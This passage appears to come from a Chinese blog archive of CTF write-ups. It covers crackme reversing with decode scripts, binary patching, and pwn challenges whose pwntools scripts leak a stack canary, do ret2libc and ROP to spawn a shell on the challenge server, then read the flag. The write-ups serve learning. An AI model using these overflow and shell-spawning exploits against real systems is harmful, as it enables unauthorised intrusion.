dword_40708C; v6 = dword_407090; v8 = word_407098; v9 = byte_40709A; v7 = dword_407094; if ( strlen(a1) == strlen((const char *)&amp;v5) ) &#123; v1 = 0; if ( strlen(a1) != 0 ) &#123; do a1[v1++] ^= 0x20u; while ( v1 &lt; strlen(a1) ); &#125; v2 = 0; if ( strlen((const char *)&amp;v5) != 0 ) &#123; do *((_BYTE *)&amp;v5 + v2++) -= 5; while ( v2 &lt; strlen((const char *)&amp;v5) ); &#125; v3 = 0; if ( strlen((const char *)&amp;v5) == 0 ) return 1; while ( *((_BYTE *)&amp;v5 + v3 + a1 - (const char *)&amp;v5) == *((_BYTE *)&amp;v5 + v3) ) &#123; if ( ++v3 &gt;= strlen((const char *)&amp;v5) ) return 1; &#125; &#125; return 0;&#125; 可知flag的长度和v5相等，flag每位与0x20异或，v5每位减5之后，flag[i]=v5[i]。 逆运算脚本如下： 12345678v5=[0x68,0x57,0x19,0x48,0x50,0x6e,0x58,0x78,0x54,0x6a,0x19,0x58,0x5e,6]temp=[]for i in v5: i-=5 i^=0x20 key.append(i)flag=&apos;&apos;.join([chr(i) for i in temp])print flag NSCTF Reverse 500pyc文件直接在线反编译一波： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394data = &quot;M,\\x1d-\\x18&#125;E&apos;\\x1ezN~\\x1b*\\x19+\\x12%\\x1d-&quot; + &apos;I\\x7fM(I&#123;I\\x7fJ.\\x16wWcRj\\x0e6\\x0fn&apos; + &apos;Zo\\nn\\x0fk\\t1R7\\x03g\\x067\\x00eUb\\x043&apos; + &apos;\\x014\\x071Rr\\x14x\\x19~D?q&quot;a5s,A%&apos; + &quot;\\x10&apos;\\x11uLyA%\\x1d|DrFv\\x12t\\x11#B&amp;&quot; + &apos;GsKzK*O)\\x1c%GuC&gt;\\x1e\\x7f\\x1b+\\x19*&apos; + &apos;\\x1e&amp;\\x14-\\x1f/\\x1axAqBq@yO-LtE&#125;&apos; + &apos;\\x1b,MuBp\\x12&apos;import osimport sysimport structimport cStringIOimport stringimport disimport marshalimport typesimport randomcount = 0def reverse(string): return string[::-1]data_list = list(reverse(data)[1:])def decrpyt(c, key2): global count data_list[count] = c ^ key2 count += 1def GetFlag1(): key = struct.unpack(&apos;B&apos;, data[len(data) - 8])[0] for c in data_list: if count == 0: decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) continue key = struct.unpack(&apos;B&apos;, data[len(data) - 3])[0] decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) for c in data_list[::-1]: print chr(c), def GetFlag2(): key = struct.unpack(&apos;B&apos;, data[len(data) - 11])[0] for c in data_list: if count == 0: decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) continue key = struct.unpack(&apos;B&apos;, data[len(data) - 4 - count])[0] decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) for c in data_list[::-1]: print chr(c), def GetFlag3(): key = struct.unpack(&apos;B&apos;, data[len(data) - 5])[0] for c in data_list: if count == 0: decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) continue key = struct.unpack(&apos;B&apos;, data[len(data) - 2 - count])[0] decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) for c in data_list[::-1]: print chr(c), def GetFlag4(): global count key = struct.unpack(&apos;B&apos;, data[len(data) - 1])[0] for c in data_list: if count == 0: decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) continue key = struct.unpack(&apos;B&apos;, data[len(data) - 1 - count])[0] decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) count = 0 for c in data_list[::-1]: print chr(c), def GetFlag5(): key = struct.unpack(&apos;B&apos;, data[len(data) - 9])[0] for c in data_list: if count == 0: decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) continue key = struct.unpack(&apos;B&apos;, data[len(data) - 3 - count])[0] decrpyt(struct.unpack(&apos;B&apos;, c)[0], key) for c in data_list[::-12]: print chr(c), GetFlag1() 直接运行一波，发现会对data进行报错，百度后发现时在反编译时，例如0f aa这样的指令时会变成\\xfa\\xa*这样，就会导致错位⽽而解不出flag。 这时可以用winhex打开pyc文件，找到data，然后自己进行转换就行了，data用十六进制表示为： 14D2C1D2D 187D4527 1E7A4E7E 1B2A192B 12251D2D 73140000 00497F4D 28497B49 7F4A2E16 77576352 6A0E360F 6E731400 00005A6F 0A6E0F6B 09315237 03670637 00655562 04337314 00000001 34073152 72147819 7E443F71 22613573 2C412573 14000000 10271175 4C794125 1D7C4472 46761274 11234226 73140000 0047734B 7A4B2A4F 291C2547 75433E1E 7F1B2B19 2A731400 00001E26 142D1F2F 1A784171 42714079 4F2D4C74 457D7307 0000001B 2C4D7542 7012 然而运行后得不到flag，不过这里定义了5个getflag函数，一个个尝试后在getflag4时找到了flag。 NSCTF Reverse 400py2exe的逆向，参考PyInstaller Extractor安装和使用方法 在reverse03里找到了一些代码： 12345678910111213141516171819202122data=\\&quot;\\x1c\\x7a\\x16\\x77\\x10\\x2a\\x51\\x1f\\x4c\\x0f\\x5b\\x1d\\x42\\x2f\\x4b\\x7e\\x4a\\x7a\\x4a\\x7b&quot;+\\&quot;\\x49\\x7f\\x4a\\x7f\\x1e\\x78\\x4c\\x75\\x10\\x28\\x18\\x2b\\x48\\x7e\\x46\\x23\\x12\\x24\\x11\\x72&quot;+\\&quot;\\x4b\\x2e\\x1b\\x7e\\x4f\\x2b\\x12\\x76\\x0b&quot;&apos;&apos;&apos;char buf[] = &quot;flag:&#123;NSCTF_md5098f6bcd4621d373cade4e832627b4f6&#125;&quot;;int _tmain(int argc, _TCHAR* argv[])&#123; printf(&quot;%d\\n&quot;, strlen(buf)); char key = &apos;\\x0b&apos;; buf[47] ^= key; for (int i = 1; i &lt; 48; i++) &#123; buf[48 - i - 1] ^= buf[48 - i]; &#125; return 0;&#125;&apos;&apos;&apos;print &quot;Revese it?????????&quot; 直接就给出了flag，然而并不正确，看来给了一段c的代码是要用到的。 后发现对data进行如c代码的运算后就可以得到flag，逆运算脚本： 12345678data=&quot;\\x1c\\x7a\\x16\\x77\\x10\\x2a\\x51\\x1f\\x4c\\x0f\\x5b\\x1d\\x42\\x2f\\x4b\\x7e\\x4a\\x7a\\x4a\\x7b&quot;+&quot;\\x49\\x7f\\x4a\\x7f\\x1e\\x78\\x4c\\x75\\x10\\x28\\x18\\x2b\\x48\\x7e\\x46\\x23\\x12\\x24\\x11\\x72&quot;+&quot;\\x4b\\x2e\\x1b\\x7e\\x4f\\x2b\\x12\\x76\\x0b&quot;temp=list(data)for i in range(0,len(temp)-2): temp[i]=chr(ord(temp[i])^ord(temp[i+1]))temp[47]=chr(ord(temp[47])^0x0b)flag=&apos;&apos;.join(i for i in temp)print flag bin100(ebCTF 2013)一个掷🎲小游戏，掷出需要的数字就能得到flag。 用od打开，字符串搜索，定位到： 120040192B /75 5E jnz short Dice.0040198B0040192D . |C74424 04 1F4&gt;mov dword ptr ss:[esp+0x4],Dice.0044421F ; [*] You rolled a three! Good! 可见这里就是判断掷出的🎲是不是需要的数字，如果不是的话，jnz就会使得进程跳到失败，所以把jnz这一句nop掉就可以跳过判断，使程序认为掷出了需要的数字，后面还有四个一样的地方，也nop掉之后f9运行程序，回车掷完🎲之后，f8往下运行就可以得到flag。 该题不简单一开始没仔细看题目，以为成功登陆就可以得到flag…后来发现是要找到对应用户名hello的注册码，还是用ida打开看看吧。 文本搜索一下无效，找到了关键函数： 12345678910111213141516171819202122232425262728String[0] = 0;memset(&amp;String[1], 0, 0x1Cu);v3 = 0;v4 = 0;String1 = 0;memset(&amp;v10, 0, 0x1Cu);v11 = 0;v12 = 0;String2 = 0;memset(&amp;v6, 0, 0x1Cu);v7 = 0;v8 = 0;if ( GetDlgItemTextA(hDlg, 1000, String, 16) &lt; 5 ) return 1;GetDlgItemTextA(hDlg, 1001, &amp;String1, 16);v1 = 0;if ( strlen(String) != 0 )&#123; do &#123; *(&amp;String2 + v1) = (v1 + v1 * String[v1] * String[v1]) % 0x42 + 33; ++v1; &#125; while ( v1 &lt; strlen(String) );&#125;strcpy(String, &quot;Happy@&quot;);lstrcatA(String, &amp;String2);return lstrcmpA(&amp;String1, String) != 0; 如果这个函数返回1的话就是注册码正确了。输入用户名后，注册码[i]=i+i*用户名[i]*用户名[i]%0x42+33，再在前面加上Happy@就得到注册码了。 脚本如下： 12345username=&quot;hello&quot;string2=&quot;&quot;for i in range(len(username)): string2+=chr(i+i*ord(username[i])*ord(username[i])%0x42 +33)print &quot;Happy@&quot;+string2 这样的明文密码用od调试应该会更快一点，可以直接看到注册码是什么。","categories":[],"tags":[]},{"title":"geek-no-gdb","slug":"geek-no-gdb","date":"2018-10-19T08:01:32.000Z","updated":"2018-10-19T08:19:30.535Z","comments":true,"path":"2018/10/19/geek-no-gdb/","link":"","permalink":"http://yoursite.com/2018/10/19/geek-no-gdb/","excerpt":"","text":"题目地址 话说好像是要用gdb调试的，然而之前一直没用过gdb，对着教程弄了一会，也许是因为编译时没有-g导致调试不起来，只能拖进ida看看，发现大部分函数也是能看的，不过最关键的一段函数却无法使用f5，只能怼汇编了： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970sub_400716 proc near ; CODE XREF: main+B0↓ps = qword ptr -68hvar_54 = dword ptr -54hs2 = byte ptr -50hvar_48 = qword ptr -48hvar_40 = qword ptr -40hvar_38 = qword ptr -38hvar_30 = qword ptr -30hvar_28 = word ptr -28hvar_18 = qword ptr -18h; __unwind &#123; push rbp mov rbp, rsp nop sub rsp, 68h mov [rbp+s], rdi mov rax, fs:28h mov [rbp+var_18], rax xor eax, eax mov rax, &apos;kVPSOwmg&apos; mov qword ptr [rbp+s2], rax mov rax, &apos;YkQ\\@kQV&apos; mov [rbp+var_48], rax mov rax, &apos;QC[Dk@G[&apos; mov [rbp+var_40], rax mov rax, &apos;kg&#123;kXARF&apos; mov [rbp+var_38], rax mov rax, &apos;FQSSAVQP&apos; mov [rbp+var_30], rax mov [rbp+var_28], &apos;I&apos; mov [rbp+var_54], 0 jmp short loc_4007A3; ---------------------------------------------------------------------------loc_400787: ; CODE XREF: sub_400716+A2↓j mov eax, [rbp+var_54] cdqe movzx eax, [rbp+rax+s2] xor eax, 34h mov edx, eax mov eax, [rbp+var_54] cdqe mov [rbp+rax+s2], dl add [rbp+var_54], 1loc_4007A3: ; CODE XREF: sub_400716+6F↑j mov eax, [rbp+var_54] movsxd rbx, eax mov rax, [rbp+s] mov rdi, rax ; s call _strlen cmp rbx, rax jb short loc_400787 lea rdx, [rbp+s2] mov rax, [rbp+s] mov rsi, rdx ; s2 mov rdi, rax ; s1 call _strcmp test eax, eax jnz short loc_4007DD mov edi, offset s ; &quot;Yeah!Prison break!&quot; call _puts jmp short loc_4007E7; ---------------------------------------------------------------------------loc_4007DD: ; CODE XREF: sub_400716+B9↑j mov edi, offset aNoYouFailed ; &quot;No!You Failed&quot; call _puts 一通操作就是把一开始的输入读入s，然后再把一个字符串读入s2，如果对于s的每一位异或0x34后与s2相等就ok啦，所以flag=s2^0x34，逆运算脚本如下： 123s2=&quot;gmwOSPVkVQk@\\QkY[G@kD[CQFRAXk&#123;gkPQVASSQFI&quot;flag=&apos;&apos;.join([chr(ord(i)^0x34) for i in s2])print flag 不知道怎么用gdb真是鶸啊orz","categories":[],"tags":[]},{"title":"CNSSrecruit-3","slug":"CNSSrecruit-3","date":"2018-10-15T15:05:31.000Z","updated":"2018-10-20T10:57:54.205Z","comments":true,"path":"2018/10/15/CNSSrecruit-3/","link":"","permalink":"http://yoursite.com/2018/10/15/CNSSrecruit-3/","excerpt":"","text":"GuessPigeon3开了canary保护，提供了libc.so文件。参考文章write函数泄露+用地址跳回重执行主函数 guess函数： 123456789101112131415unsigned int guess()&#123; char buf; // [esp+8h] [ebp-70h] unsigned int v2; // [esp+6Ch] [ebp-Ch] v2 = __readgsdword(0x14u); memset(&amp;buf, 0, 0x64u); puts(&quot;You You have two chances. Please input your guess:&quot;); read(0, &amp;buf, 0x100u); printf(&quot;You guessed the pigeon number is %s .\\nI&apos;m sorry, you guessed wrong.&quot;, &amp;buf); puts(&quot;Please input your guess again:&quot;); read(0, &amp;buf, 0x100u); puts(&quot;You&apos;ve been fooled.There are no pigenos here!\\n Good bye~&quot;); return __readgsdword(0x14u) ^ v2;&#125; v2就是canary，buf存在栈溢出。 ida打开libc.so.6，找到system的偏移地址。/bin/sh字符串的偏移地址可以用winhex打开libc文件查找（详见参考文章，很给力）。 第一次输入后会对输入进行一次输出，可以利用这一次输出把canary带出来，在第二次输入中使用来跳过canary保护。 然后第二次输入时利用栈溢出覆盖掉guess函数的返回地址，调用write函数，输出write函数的真实地址来计算libc的起始地址，就可以计算出system函数的真实地址。同时将write函数的返回地址填充为main函数的地址，这样在第二次输入完之后又会再次进入main函数。 这样再次进入main函数之后，就可以开shell了。脚本如下： 12345678910111213141516171819202122232425262728293031from pwn import *elf1=ELF(&quot;./GuessPigeon3&quot;)elf2=ELF(&quot;./libc.so.6&quot;)plt_write=elf1.plt[&quot;write&quot;]got_write=elf1.got[&quot;write&quot;]system_libc=0x3ada0bin_sh_libc=0x15ba0bsh=remote(&quot;132.232.34.26&quot;,8888)sh.recvuntil(&quot;token:&quot;)sh.sendline(&quot;GuessPigeon3&quot;)sh.recvuntil(&quot;guess:&quot;)sh.sendline(&apos;a&apos;*95+&quot;abcde&quot;)sh.recvuntil(&quot;abcde&quot;)sh.recv(1)canary=&apos;\\x00&apos;+sh.recv(3)sh.recvuntil(&quot;again:&quot;)payload=&apos;a&apos;*100+canary+&apos;a&apos;*12+p32(plt_write)+p32(0x080486c4)+p32(1)+p32(got_write)+p32(4)sh.sendline(payload)sh.recvuntil(&apos;bye~\\n&apos;)leak=u32(sh.recv(4))libc_base=leak-elf2.symbols[&apos;write&apos;]system=libc_base+system_libcbin_sh=libc_base+bin_sh_libcsh.recvuntil(&quot;guess:&quot;)sh.sendline(&apos;1&apos;)sh.recvuntil(&quot;again:&quot;)payload=&apos;a&apos;*100+canary+&apos;a&apos;*12+p32(system)+p32(1)+p32(bin_sh)sh.sendline(payload)sh.recv()sh.interactive() 发现程序十秒不输入就会自行结束，所以把cat flag的操作也写进脚本吧。 123sh.sendline(&quot;cd ..&quot;)sh.sendline(&quot;cat flag_GuessPigeon3&quot;)sh.recv() 诡异的修罗铭文","categories":[],"tags":[]},{"title":"CNSSrecruit-2","slug":"CNSSrecruit-2","date":"2018-10-14T14:32:19.000Z","updated":"2018-10-15T13:57:51.975Z","comments":true,"path":"2018/10/14/CNSSrecruit-2/","link":"","permalink":"http://yoursite.com/2018/10/14/CNSSrecruit-2/","excerpt":"","text":"childNc主函数如下： 123456789101112131415161718v8 = __readfsqword(0x28u);setvbuf(stdin, 0LL, 2, 0LL);setvbuf(stdout, 0LL, 2, 0LL);setvbuf(stderr, 0LL, 2, 0LL);puts(&quot;Please input two right numbers:&quot;);__isoc99_scanf(&quot;%d %d&quot;, &amp;v4, &amp;v5);v6 = v4 + v5;v7 = v4 - v5;if ( v4 + v5 != 19 || v7 != 5 )&#123; puts(&quot;Try again~&quot;);&#125;else&#123; puts(&quot;Gooood!you get shell!Can you find the flag?\\n&quot;); system(&quot;/bin/sh&quot;);&#125;return 0; 可以发现输入12和7就可以获得shell，然而ls并没有发现flag文件，原来是隐藏了起来，用ls -f查看隐藏文件，在..里找到flag。 12345678910ls -fstartpwn.sh.startdocker.sh..childNccd ..lsbinflag_childNc GuessPigeon程序自带getshell函数，所以只要找一个栈溢出然后把返回地址修改成getshell的地址就ok了，脚本如下 一开始没看一下有没有开什么保护啥的，结果试了半天也没能成功……后来发现开了canary保护，现场百度一波，找到了大佬的教程Linux pwn入门教程(9)——stack canary与绕过的思路，不过研究了一晚上发现这一题并不需要用到这篇教程里的东西….. 主程序如下： 1234567891011121314int __cdecl main(int argc, const char **argv, const char **envp)&#123; unsigned int v3; // eax int v4; // ST1C_4 init(); puts(&quot;Welcome to CNSS Recruit 2018\\n&quot;); puts(&quot;Let&apos;s guess the pigeon number together!&quot;); v3 = time(0); srand(v3); v4 = rand(); guess(v4); return 0;&#125; v3就是canary的值，guess函数如下： 123456789101112131415161718unsigned int __cdecl guess(int a1)&#123; char nptr; // [esp+8h] [ebp-70h] unsigned int v3; // [esp+6Ch] [ebp-Ch] v3 = __readgsdword(0x14u); puts(&quot;Please input your guess:&quot;); __isoc99_scanf(&quot;%s&quot;, &amp;nptr); if ( atoi(&amp;nptr) == a1 ) &#123; puts(&quot;My Gooood!You guessed the pigeon number!!&quot;); getshell(); &#125; else &#123; printf(&quot;You are wrong!The pigeon&apos;s number is %d\\n try again~&quot;, a1); &#125; return __readgsdword(0x14u) ^ v3; 栈中各变量的分布顺序： 123nptrcanarya1 这里可以通过scanf的栈溢出来修改a1，也就是v4的值。atoi()函数是将字符串转化为整形，例如’0’就会被转换成0，所以scanf输入时我选择全部用’0’填充，到了a1的值时使用p32(0)把a1修改为0，这样就使得guess函数中的判断成立，在函数结束之前进入了shell，无所谓是不是触发canary保护了。 脚本如下： 123456789from pwn import *elf=ELF(&quot;2&quot;)sh=remote(&quot;132.232.34.26&quot;,8888)print sh.recvuntil(&apos;token:&apos;)sh.sendline(&apos;GuessPigeon&apos;)print sh.recvuntil(&apos;guess:&apos;)payload=&apos;0&apos;*0x78+p32(0)sh.sendline(payload)sh.interactive() flag文件依旧是隐藏在..文件夹中，不过既然题目是在同一个平台，前面提示了后面也就不会很懵逼了。 GuessPigeon2本题参考了i春秋上面大佬的教程Linux pwn入门教程(3)——ROP技术 主函数： 123456789101112int result; // eaxchar buf; // [rsp+0h] [rbp-70h]puts(&quot;Please input your guess:&quot;);__isoc99_scanf((__int64)&quot;%s&quot;, (__int64)&amp;buf);puts(&quot;You&apos;ve been fooled.There are no pigenos here!\\n Good bye~&quot;);puts(&quot;Do you want to get hint? yes/no?&quot;);read(0, &amp;buf, 0x100uLL);result = strcmp(&amp;buf, &quot;yes&quot;);if ( !result ) result = printf(&quot;Do you know \\&quot;%s\\&quot;\\n&quot;, s);return result; 函数列表里有system函数，只是参数不是/bin/sh。buf存在栈溢出，并且有两次输入都是输入到buf，所以第一次输入随便输入点什么，第二次输入时利用栈溢出调用system函数，并且发现s中储存的字符串正好是/bin/sh，可以用来作为system函数的参数。但是这个和之前做的那题有system函数没参数的不一样，这题是64位的，那题是32位的。 “在x64下通常参数从左到右依次放在rdi, rsi, rdx, rcx, r8, r9，多出来的参数才会入栈（根据调用约定的方式可能有不同，通常是这样），因此，我们就需要一个给RDI赋值的办法。由于我们可以控制栈，根据ROP的思想，我们需要找到的就是pop rdi; ret，前半段用于赋值rdi，后半段用于跳到其他代码片段。” 所以我们需要找一个命令pop rdi,这里可以使用ROPgadget ROPgadget --binary 1 | grep &quot;pop rdi&quot; 这里找到的地址是0x400933,同时在ida中查看到call system的地址是0x4007cf,s的地址是0x600e20，利用这些就可以编写payload。 脚本如下： 1234567891011from pwn import *elf=ELF(&quot;1&quot;)sh=remote(&quot;132.232.34.26&quot;,8888)sh.recvuntil(&apos;token:&apos;)sh.sendline(&apos;GuessPigeon2&apos;)sh.recvuntil(&apos;Please input your guess:&apos;)sh.sendline(&apos;1&apos;)sh.recvuntil(&apos;yes/no?&apos;)payload=&apos;a&apos;*0x78+p64(0x400933)+p64(0x600e20)+p64(0x4007cf)sh.sendline(payload)sh.interactive() 成功进入shell，这题的flag也是藏在了..文件夹里，cd ..之后cat flag。","categories":[],"tags":[]},{"title":"CNSSrecruit-1","slug":"CNSSrecruit-1","date":"2018-10-13T08:28:12.000Z","updated":"2018-10-13T11:51:00.118Z","comments":true,"path":"2018/10/13/CNSSrecruit-1/","link":"","permalink":"http://yoursite.com/2018/10/13/CNSSrecruit-1/","excerpt":"","text":"RE签到题shift+f12查看字符串 2048一个小游戏，得到100w分得到flag，既然能用CE,为什么不用呢XD 海南鸽子关键部分： 12345678910scanf(&quot;%19s&quot;, &amp;v6);sub_401005(&amp;v6, (int)&amp;v2);for ( i = 0; i &lt; strlen(&amp;v2); ++i ) --*(&amp;v2 + i);if ( !strcmp(&amp;v2, &quot;X14yb2sEVk8BXWMkMiQ8&quot;) ) printf(&quot;Success!\\n\\n&quot;);else printf(aWrongFlagO);system(&quot;pause&quot;);return 0; sub401005是base64加密，判断方式为如果输入进行base64加密后，再每一位减去1,若与X14yb2sEVk8BXWMkMiQ8相等则success，逆运算得到flag。 推箱子游戏题目直接提示了关键点： 12345678910111213141516171819202122232425262728293031323334353637383940414243stream = fopen(&quot;./score.data&quot;, &quot;rb+&quot;); if ( stream ) &#123; ptr = 0LL; v6 = 0LL; v0 = 16LL; fread(&amp;ptr, 0x10uLL, 1uLL, stream); fclose(stream); puts(&quot;-----Score Board-----&quot;); LODWORD(v3) = 0; while ( (signed int)v3 &lt;= 3 ) &#123; v0 = (unsigned int)(v3 + 1); printf(&quot;level%d: %d steps\\n&quot;, v0, *((unsigned int *)&amp;ptr + (signed int)v3), v3); LODWORD(v3) = v3 + 1; &#125; if ( ptr == 0x2500000011LL ) &#123; v7 = -8977570383032666059LL; v8 = 4503996766676335161LL; v9 = 51; v10 = 105; v11 = 52; v12 = -122; v13 = 78; v14 = 105; v15 = 102; v16 = 67; v17 = -124; v18 = 108; v19 = 58; v20 = 51; v21 = 75; v22 = -106; v23 = 0; for ( HIDWORD(v3) = 0; SHIDWORD(v3) &lt;= 29; ++HIDWORD(v3) ) &#123; *((_BYTE *)&amp;v7 + SHIDWORD(v3)) -= 48; *((_BYTE *)&amp;v7 + SHIDWORD(v3)) ^= 0x66u; &#125; v0 = (unsigned __int64)&amp;v7; printf(&quot;\\n%s\\n&quot;, &amp;v7, v3); &#125; 这里有两个选择，一是根据ptr==0x2500000011，将score.data中的数据改成1100 0000 2500 0000 0000 0000 0000 0000,然后再打开scoreboard就可以触发条件得到flag，二是直接根据生成flag的函数计算出flag。 源码审计源码define了很多哲学词汇，例如deep♂dark♂fantasy。用sublime搜索全部然后替换掉就看起来很明白了，不过要注意的是，定义变量时也定义了很多带_的变量，不注意的话可能会替换错误，处理后代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;char input[1024] = &#123; 0 &#125;;int aaa(char* b)&#123; int v3 = 0,v2 = 0; char key[] =&#123; 0,0,0,0x21, 0x5, 0x32, 0x43, 0x54, 0x21, 0x8, 0x32, 0x43, 0x54, 0x21, 0x15, 0x32, 0x43, 0x54, 0x21, 0x15, 0x32, 0x43, 0x54, 0x21, 0x1d, 0x32, 0x43, 0x54, 0x21, 0x7, 0x32, 0x43, 0x54, 0x21, 0x39, 0x32, 0x43, 0x54, 0x21, 0x55, 0x32, 0x43, 0x54, 0x21, 0x27, 0x32, 0x43, 0x54, 0x21, 0x15, 0x32, 0x43, 0x54, 0x21, 0x1f, 0x32, 0x43, 0x54, 0x21, 0x39, 0x32, 0x43, 0x54, 0x21, 0x30, 0x32, 0x43, 0x54, 0x21, 0xb, 0x32, 0x43, 0x54, 0x21, 0x1b, 0x32, 0x43, 0x54 ,0x65&#125;; int i = 0; int i_ = 0;1: int p__ = key[i ++]; if (p__== 0) goto 1; if (p__== 0x21) goto 2; if (p__== 0x32) goto 3; if (p__== 0x43) goto 4; if (p__== 0x54) goto 5; if (p__== 0x65) goto 6;3: v2 = input[i_ ++]; goto 7;4: v3 = v3^0x66^v2; goto 1;2: v3 = key[i ++]; goto 7;7: goto 1;5: if (v3== 0) goto 1;6: return v3;&#125;int main()&#123; printf(&quot;Please &quot;); printf(&quot;input &quot;); printf(&quot;flag:&quot;); scanf(&quot;%s&quot;, input); if(strlen(input)==15) goto start;start: int p = aaa(input); if (p==0) &#123; printf(&quot;\\no yes\\n&quot;); system(&quot;pause&quot;); return 0; &#125;end: printf(&quot;\\nnonono\\n&quot;); system(&quot;pause&quot;); return 0;&#125; 分析可以发现，根据key中的值，对input进行处理之后如果v3=0的话就可以了。key中0x21,****,0x32,0x43,0x54构成一个循环，操作是使得****处的值异或input中的值再异或0x66等于0，所以input=****^0x66，运算脚本如下： 123key=[0x5,0x8,0x15,0x15,0x1d,0x7,0x39,0x55,0x27,0x15,0x1f,0x39,0x30,0xb,0x1b]flag=&quot;&quot;.join([chr(i^0x66)for i in key])print flag","categories":[],"tags":[]},{"title":"sus-unpackme","slug":"sus-unpackme","date":"2018-10-11T15:20:59.000Z","updated":"2018-10-21T14:18:49.043Z","comments":true,"path":"2018/10/11/sus-unpackme/","link":"","permalink":"http://yoursite.com/2018/10/11/sus-unpackme/","excerpt":"","text":"peid查壳upx壳，尝试手动脱壳。然而对着教程发现，用od载入时我的od载入的一开始并不是push ad，也就一直没有办法脱壳。百度了接近半个晚上才知道，原来虚拟机里用od时不要把要载入的文件放在共享文件夹里，否则就会出现这种状况，把unpackme.exe拖到虚拟机文件夹里后脱壳成功。 定位到关键函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465pdwDataLen = 16;if ( a2 == 514 )&#123; v4 = GetParent(hWnd); v5 = GetDlgItemTextA(v4, 101, &amp;String, 63); if ( v5 ) &#123; phProv = 0; phHash = 0; if ( !CryptAcquireContextA(&amp;phProv, 0, 0, 1u, 0xF0000000) || !CryptCreateHash(phProv, 0x8003u, 0, 0, &amp;phHash) || !CryptHashData(phHash, (const BYTE *)&amp;String, v5, 0) || !CryptGetHashParam(phHash, 2u, (BYTE *)pbData, &amp;pdwDataLen, 0) ) &#123; ExitProcess(1u); &#125; CryptDestroyHash(phHash); CryptReleaseContext(phProv, 0); v7 = pbData; v8 = dword_4128A0; v9 = 12; while ( *(_DWORD *)v7 == *v8 ) &#123; v7 += 4; ++v8; v10 = v9 &lt; 4; v9 -= 4; if ( v10 ) &#123; v11 = String; v12 = 0; v13 = 3; v14 = 2; do &#123; *(&amp;Text + v12) = v11 ^ byte_410A80[v12] ^ pbData[v12 &amp; 0xF]; *(&amp;v23 + v12) = v11 ^ byte_410A81[v12] ^ pbData[((_BYTE)v14 - 1) &amp; 0xF]; v15 = byte_410A80[v14] ^ pbData[v14 &amp; 0xF]; v14 += 4; *(&amp;v24 + v13 - 3) = v11 ^ v15; v16 = byte_410A80[v13] ^ pbData[v13 &amp; 0xF]; v13 += 4; v25[v12] = v11 ^ v16; v12 += 4; &#125; while ( v14 &lt; 0x22 ); if ( v12 &lt; 0x80 ) &#123; *(&amp;Text + v12) = 0; MessageBoxA(hWnd, &amp;Text, &quot;Flag is&quot;, 0x40u); ExitProcess(0); &#125; __report_rangecheckfailure(); __debugbreak(); JUMPOUT(*(_DWORD *)algn_40BDCF); &#125; &#125; MessageBoxA(hWnd, &quot;Wrong answer&quot;, &quot;HACKMECTF&quot;, 0x10u); &#125; else &#123; MessageBoxA(hWnd, &quot;Say something!&quot;, &quot;HACKMECTF&quot;, 0x10u); &#125;&#125;return MEMORY[0](hWnd, a2, a3, a4); Text处存放的就是flag 赋值语句： *(&amp;Text + v12) = v11 ^ byte_410A80[v12] ^ pbData[v12 &amp; 0xF] v11是输入的string，pbData可以在上面发现就是dword_4128A0处的值，由v12 &lt; 0x80可以知道flag的长度不超过0x20位，爆破脚本如下： 1234567891011121314import stringbyte_410a80 = [0x1A, 0x8B, 0x24, 0x28, 0x58, 0x37, 0xAC, 0x52, 0x53, 0xB5, 0x1E, 0x3E, 0x4A, 0x25, 0x4A, 0x27, 0x6B, 0xB2, 0x17, 0x01, 0x03, 0x0B, 0xF4, 0x14, 0x00, 0xF1, 0x61, 0x70, 0x0C, 0x55, 0x20, 0x7A]pbData = [0x34, 0xAF, 0x0D, 0x07, 0x4B, 0x17, 0xF4, 0x4D, 0x1B, 0xB9, 0x39, 0x76, 0x5B, 0x02, 0x77, 0x6F]for i in string.printable: a = ord(i) flag = &quot;&quot; for a1 in range(0,0x20): flag += chr(a ^ byte_410a80[a1] ^ pbData[a1&amp;0xf]) if ~flag.find(&quot;FLAG&quot;): print flag 如果flag中有”FLAG”的话，flag.find()返回的是“FLAG”所在的下标0。所以加上取反号，就可以打印出flag。","categories":[],"tags":[]},{"title":"geekgame-2","slug":"geekgame-2","date":"2018-10-11T09:44:59.000Z","updated":"2018-10-11T10:19:52.530Z","comments":true,"path":"2018/10/11/geekgame-2/","link":"","permalink":"http://yoursite.com/2018/10/11/geekgame-2/","excerpt":"","text":"陈师傅线代考了满分？希尔密码，动手算一下得到flag。 Fuze.vs.Zombieemmmmm一个小游戏，杀死1000只僵尸可以过关，掏出CE,找到了score对应的地址，一只僵尸10分，改成9990分之后再杀一只僵尸就跳出了flag。正常方法尝试中….","categories":[],"tags":[]},{"title":"geekgame-1","slug":"geekgame-1","date":"2018-10-10T15:35:34.000Z","updated":"2018-10-11T08:21:26.139Z","comments":true,"path":"2018/10/10/geekgame-1/","link":"","permalink":"http://yoursite.com/2018/10/10/geekgame-1/","excerpt":"","text":"代号为geek的行动第一幕：毒雾初现查看源代码SYC{}里有一串摩斯电码，解码得到flag。 萌萌的血小板改后缀解压得到flag.txt和一张佛像图片，用佛曰解码得到flag。 小帅圆圆的发际线，你也想要么？gif后面藏了一个rar文件，解压后得到另一张图片，内容为brainfucker，解码后得到flag。 0xpoker的QQ1234if (str.equals(&quot;U1lDe0VhMnlfQU5kcjBpZF9SMyF9&quot;)) &#123; return new Decode().decode(str);&#125; base64解密得到flag 可能没有你想的那么难ida打开搜索字符串直接得到flag 换个样子你还认识吗ida打开，主函数： 123456789101112131415161718192021222324252627__main();i = 0;memset(v11, 0, sizeof(v11));v8 = 0;v9 = 0;v10 = 0;v4 = 28;v5 = 13;v6 = 59;v7 = 22;BYTE2(v9) = 85;printf(&quot;plz input flag : 